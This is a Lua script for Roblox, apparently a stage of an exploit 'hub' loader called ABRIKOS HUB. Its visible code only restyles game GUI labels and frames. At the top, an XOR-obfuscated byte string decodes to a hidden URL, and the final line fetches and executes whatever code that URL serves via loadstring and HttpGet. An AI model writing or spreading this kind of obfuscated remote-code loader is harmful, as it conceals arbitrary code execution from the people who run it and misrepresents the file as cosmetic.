
--[[ STAGE 2: VISUAL CORE ]]
local CBlxKPehqMtQp1CCW="\147\128\129\126\126\070\092\093\129\149\136\096\154\161\141\162\144\154\146\141\164\142\160\173\173\152\170\176\155\114\168\181\184\119\183\185\185\177\190\183\192\181\191\165\187\131\183\168\196\187\196\177\192\204\205\141\208\197\206\208\146\215\189\203\201\216\210\233\247\201\193\215\193\195\221\225\203\243\166\245\004\231\231\249\007\213\223\253\213\150\175\149\177\156\004\249\246\225\219\237\244\011\169\246\171\248\247\164\167\170\195\006\240\253"local gqwUCCh7e3WfAXFBkwpiwP=50 local FnUaV5t7IclzusErM3=41 local C72TMAEG02AT9k1JFf_pI=0 local QEB6FTCr8C59=1 local uAlP47NQWqsZ=15 local Urx2SPevY3RX=false local ANe4aGpOCNJsE1CX=bit32 and bit32.bxor if not ANe4aGpOCNJsE1CX then ANe4aGpOCNJsE1CX=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vY14ub9rrcvIz3nVP9yDh={}for ETgihq_tf1zbo=1,#CBlxKPehqMtQp1CCW do local op1oATLtf24rk0=string.byte(CBlxKPehqMtQp1CCW,ETgihq_tf1zbo)local QPI7abVkeQk05FyueS_=(FnUaV5t7IclzusErM3+(ETgihq_tf1zbo*QEB6FTCr8C59)+uAlP47NQWqsZ)%256 if C72TMAEG02AT9k1JFf_pI==0 then op1oATLtf24rk0=(op1oATLtf24rk0-QPI7abVkeQk05FyueS_)%256 vY14ub9rrcvIz3nVP9yDh[ETgihq_tf1zbo]=string.char(ANe4aGpOCNJsE1CX(op1oATLtf24rk0,gqwUCCh7e3WfAXFBkwpiwP))else op1oATLtf24rk0=ANe4aGpOCNJsE1CX(op1oATLtf24rk0,gqwUCCh7e3WfAXFBkwpiwP)vY14ub9rrcvIz3nVP9yDh[ETgihq_tf1zbo]=string.char((op1oATLtf24rk0-QPI7abVkeQk05FyueS_)%256)end end local XyUDqsOP6_qfFllw=table.concat(vY14ub9rrcvIz3nVP9yDh)if Urx2SPevY3RX then XyUDqsOP6_qfFllw=string.reverse(XyUDqsOP6_qfFllw)end local srTLtq_Ox5InNkiXS=XyUDqsOP6_qfFllw
local HubName = "ABRIKOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(srTLtq_Ox5InNkiXS))()
